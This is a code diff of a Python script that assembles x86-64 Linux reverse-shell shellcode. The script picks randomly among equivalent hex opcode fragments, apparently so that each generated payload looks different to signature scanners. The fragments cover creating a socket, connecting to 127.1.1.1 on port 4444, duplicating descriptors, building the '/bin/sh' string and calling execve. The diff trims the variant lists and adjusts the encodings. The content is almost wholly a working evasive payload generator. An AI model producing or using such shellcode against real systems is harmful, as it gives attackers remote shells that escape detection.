@@ -12,9 +12,8 @@ create_socket_1 = ["B029", "b0280401", "b02a2c01"]
 
 #xor rdi, rdi -> 4831FF
 # xor r8, r8 - mov rdi, r8 -> 4D31C04C89C7
-# mov dil, 1 - sub dil, 1 -> 40B7014080EF01
 
-create_socket_2 = ["4831FF", "4D31C04C89C7", "40B7014080EF01"]
+create_socket_2 = ["4831FF", "4D31C04C89C7"]
 
 #add rdi, 2 -> 4883C702
 #mov dil, 2 -> 40B702
@@ -24,21 +23,19 @@ create_socket_3 = ["4883C702", "40B702", "40B7034080EF01"]
 
 #xor rsi, rsi -> 4831F6
 #xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
-# mov sil, 1 - sub sil, 1 -> 40B6014080EE01
 
-create_socket_4 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]
+create_socket_4 = ["4831F6", "4D31C04C89C6"]
 
 #add rsi, 1 -> 4883C601
 #mov sil, 1 -> 40B601
-# mov sil, 2 - sub sil, 1 -> 40B6024080EE01
+# mov sil, 2 - sub sil, 1 -> 40B6024080EE01 
 
 create_socket_5 = ["4883C601", "40B601", "40B6024080EE01"]
 
 #xor rdx, rdx -> 4831D2
 #xor r8, r8 - mov rdx, r8 -> 4D31C04C89C2
-#mov dl, 1 - sub dl, 1 -> B20180EA01
 
-create_socket_6 = ["4831D2", "4D31C04C89C2", "B20180EA01"]
+create_socket_6 = ["4831D2", "4D31C04C89C2"]
 
 #syscall -> 0F05
 
@@ -75,12 +72,12 @@ connexion_socket_5 = ["687F010101"]
 
 #push word 0x5c11 -> D05C11
 
-connexion_socket_6 = ["D05C11"]
+connexion_socket_6 = ["6668115C"]
 
 
 #push word 0x02 -> D002
 
-connexion_socket_7 = ["D002"]
+connexion_socket_7 = ["666A02"]
 
 #mov rsi, rsp -> 4889E6
 # xor r8, r8 - mov r8, rsp - mov rsi, r8 -> 4D31C04989E04C89C6
@@ -100,7 +97,7 @@ connexion_socket_10 = ["0F05"]
 #xor r8, r8 - mov rsi, r8 -> 4D31C04C89C6
 # mov sil, 1 - sub sil, 1 -> 40B6014080EE01
 
-connexion_socket_11 = ["4831F6", "4D31C04C89C6", "40B6014080EE01"]
+connexion_socket_11 = ["4831F6",]
 
 #mov sil, 2 -> 40B602
 #xor r8, r8 - mov r8b, 2 - mov sil, r8b -> 4D31C041B0024488C6
@@ -190,16 +187,16 @@ connexion_socket_12 = ["40B602", "4D31C041B0024488C6", "4D31C941B1024488CE"]
 
 
 list_const_loop = ["7df4"]
-list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
-list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
-list_loopconstante = ["B0210F0548ffce7df4"]
-list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
-list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
+list_xorloop = ["4831c0"]
+list_loop = ["b021"]
+list_loopconstante = ["0F0548ffce7df4"]
+list_xor = ["4831c04831d2"]
+list_binbash = ["48BB2F2F62696E2F7368"]
 list_stackconst = ["50534889E750574889E6"]
-list_execve = ["B03B", "B03A0401"]
+list_execve = ["B03B"]
 list_constcallsys = ["0f05"]
-list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
-list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]
+list_exit = ["b03c"]
+list_xorsyscall = ["4831FF"]
 list_lastcallsys = ["0f05"]
 
 
@@ -207,6 +204,7 @@ shellcode += random.choice(create_socket_1)
 shellcode += random.choice(create_socket_2)
 shellcode += random.choice(create_socket_3)
 shellcode += random.choice(create_socket_4)
+shellcode += random.choice(create_socket_5)
 shellcode += random.choice(create_socket_6)
 shellcode += random.choice(create_socket_syscall)
 shellcode += random.choice(create_socket_mov)
@@ -224,11 +222,9 @@ shellcode += random.choice(connexion_socket_10)
 
 shellcode += random.choice(connexion_socket_11)
 shellcode += random.choice(connexion_socket_12)
-shellcode += random.choice(list_const_loop)
 shellcode += random.choice(list_xorloop)
 shellcode += random.choice(list_loop)
 shellcode += random.choice(list_loopconstante)
-shellcode += random.choice(list_loop)
 shellcode += random.choice(list_xor)
 shellcode += random.choice(list_binbash)
 shellcode += random.choice(list_stackconst)
